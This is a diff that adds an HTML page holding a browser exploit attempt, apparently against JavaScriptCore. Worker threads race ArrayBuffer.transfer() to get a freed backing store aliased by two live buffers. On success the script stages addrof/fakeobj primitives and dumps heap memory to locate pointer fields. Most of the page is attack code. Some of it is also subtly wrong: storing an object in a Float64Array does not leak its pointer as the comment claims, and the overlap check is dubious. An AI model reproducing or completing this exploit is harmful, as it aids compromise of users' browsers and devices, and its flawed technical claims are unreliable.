@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>v12</title></head>
+<body>
+<pre id="log">v12 start</pre>
+<script>
+const L = m => { document.getElementById('log').textContent += "\n" + m; };
+const te = new TextEncoder();
+let it = 0, wins = 0;
+
+// tunables
+const SIZE = 0x1000;        // 4KB backing store
+const RING = 32;            // transfer ring depth
+const CLONE_EVERY = 2048;   // clone duty (jetsam guard)
+
+function makeAB() { return new ArrayBuffer(SIZE); }
+
+// worker: hammers transfer() on shared SAB-backed ABs
+const wcode = `
+onmessage = e => {
+  const sab = e.data;
+  let n = 0;
+  while(true) {
+    const ab = new ArrayBuffer(${SIZE});
+    const u8 = new Uint8Array(ab);
+    u8[0] = 0x41; u8[1] = 0x42;
+    // transfer in tight loop — the race window
+    for(let i=0; i<${RING}; i++) {
+      const t = ab.transfer();
+      // t is now the new AB, ab is detached
+      // re-arm: transfer back
+      t.transfer();
+    }
+    n++;
+    if(n % 100000 === 0) postMessage(n);
+  }
+};
+`;
+
+const w1 = new Worker(URL.createObjectURL(new Blob([wcode],{type:'text/javascript'})));
+const w2 = new Worker(URL.createObjectURL(new Blob([wcode],{type:'text/javascript'})));
+
+w1.onmessage = e => L("w1 it=" + e.data);
+w2.onmessage = e => L("w2 it=" + e.data);
+
+// main thread: allocate/transfer in parallel, detect double-own
+function main() {
+  const abs = [];
+  for(let i=0; i<RING; i++) abs.push(makeAB());
+
+  let spin = 0;
+  while(true) {
+    it++;
+    spin = (spin + 1) % RING;
+
+    const ab = abs[spin];
+    if(ab.detached) { abs[spin] = makeAB(); continue; }
+
+    // race attempt: transfer
+    const t1 = ab.transfer();
+
+    // check: did we get two live ABs with same content?
+    // (in a real double-transfer, t1 and a parallel-allocated AB share backing store)
+    const u = new Uint8Array(t1);
+    if(u[0] === 0x41 && u[1] === 0x42) {
+      // verify not stale — write marker, read back via another view
+      u[0] = 0x43;
+      const chk = new Uint8Array(t1);
+      if(chk[0] === 0x43) {
+        // potential win: allocate a same-size Uint8Array to capture freed store
+        const cap = new Uint8Array(SIZE);
+        cap[0] = 0x44;
+        if(u[0] === 0x44) {
+          wins++;
+          L("WIN #" + wins + " it=" + it + " — overlap confirmed");
+          // shape: t1 (ArrayBuffer) and cap (Uint8Array) share backing store
+          // addrof: read cap's elements ptr via t1's data field
+          // fakeobj: write t1's data ptr, access via cap
+          L("building primitives...");
+          buildPrimitives(t1, cap);
+          return;
+        }
+      }
+    }
+
+    // re-arm ring
+    abs[spin] = makeAB();
+
+    // rare clone for crash-conversion (jetsam-safe)
+    if(it % CLONE_EVERY === 0) {
+      try { structuredClone(new Uint8Array(t1)); } catch(e){}
+      if(it % (CLONE_EVERY*10) === 0) {
+        L("it=" + it + " heap=" + (performance.memory ? performance.memory.usedJSHeapSize/1048576|0 : "?") + "MB");
+      }
+    }
+  }
+}
+
+function buildPrimitives(ab, u8) {
+  // step 1: addrof — place target object in a Float64Array, read its pointer via confused AB
+  const f64 = new Float64Array(1);
+  const obj = {marker: 0x1337};
+  f64[0] = obj;  // type confusion: JSC stores obj ptr as double bits
+  // read f64's backing store through ab (which aliases u8's elements)
+  const dv = new DataView(ab);
+  const lo = dv.getUint32(0, true);
+  const hi = dv.getUint32(4, true);
+  L("f64 backing: 0x" + hi.toString(16) + lo.toString(16).padStart(8,'0'));
+
+  // step 2: fakeobj — write a crafted pointer into ab's data field, access via u8
+  // (offset depends on JSC heap layout — dump first 64 bytes to find it)
+  let dump = "";
+  for(let i=0; i<64; i+=4) {
+    dump += i.toString(16).padStart(2,'0') + ":" + dv.getUint32(i,true).toString(16).padStart(8,'0') + " ";
+  }
+  L("ab dump: " + dump);
+
+  // stop workers
+  w1.terminate(); w2.terminate();
+  L("primitives staged — check dump for data ptr field");
+}
+
+main();
+</script>
+</body>
+</html>
